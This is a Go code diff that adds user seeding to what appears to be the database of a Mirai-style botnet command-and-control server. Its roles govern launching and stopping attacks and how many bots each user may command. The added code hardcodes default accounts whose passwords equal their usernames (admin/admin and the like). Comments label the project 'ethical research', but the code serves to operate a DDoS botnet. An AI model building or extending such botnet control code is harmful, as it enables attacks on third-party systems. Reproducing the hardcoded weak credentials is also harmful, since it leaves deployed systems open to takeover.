@@ -14,6 +14,57 @@ import (
     "golang.org/x/crypto/bcrypt"
 )
 
+// ── User Seeding ──────────────────────────────────────────────────────────────
+// seedUsers ensures the three default research users exist in the database.
+// Uses bcrypt hashing (cost 10) for all passwords. Safe to call on every
+// startup — ON DUPLICATE KEY UPDATE is a no-op if the user already exists.
+//
+// Roles (enforced by cnc_modern.go JWT middleware):
+//   admin    — full access, no rate limits
+//   operator — can launch/stop attacks, 100-bot limit
+//   viewer   — read-only; blocked from /api/attack and /api/attack/stop
+func (this *Database) seedUsers() {
+	type seedUser struct {
+		username      string
+		password      string
+		maxBots       int
+		admin         int
+		durationLimit int
+		cooldown      int
+	}
+	users := []seedUser{
+		{"admin", "admin", -1, 1, 3600, 0},
+		{"operator", "operator", 100, 0, 300, 30},
+		{"viewer", "viewer", 0, 0, 0, 0},
+	}
+
+	for _, u := range users {
+		// Check if user already exists
+		row := this.db.QueryRow("SELECT username FROM users WHERE username = ?", u.username)
+		var existing string
+		if err := row.Scan(&existing); err == nil {
+			// Already exists — skip
+			continue
+		}
+
+		hash, err := bcrypt.GenerateFromPassword([]byte(u.password), bcrypt.DefaultCost)
+		if err != nil {
+			log.Printf("[SEED] bcrypt failed for %s: %v", u.username, err)
+			continue
+		}
+		_, err = this.db.Exec(
+			"INSERT INTO users (username, password, max_bots, admin, last_paid, duration_limit, cooldown, wrc, intvl) "+
+				"VALUES (?, ?, ?, ?, UNIX_TIMESTAMP(), ?, ?, 0, 30)",
+			u.username, string(hash), u.maxBots, u.admin, u.durationLimit, u.cooldown,
+		)
+		if err != nil {
+			log.Printf("[SEED] failed to insert user %s: %v", u.username, err)
+		} else {
+			auditLog("SEED_USER", u.username, fmt.Sprintf("max_bots=%d admin=%d", u.maxBots, u.admin))
+		}
+	}
+}
+
 // ── Ethical Research Audit Logger ────────────────────────────────────────────
 // All authentication events are logged for operator accountability.
 func auditLog(event string, username string, detail string) {
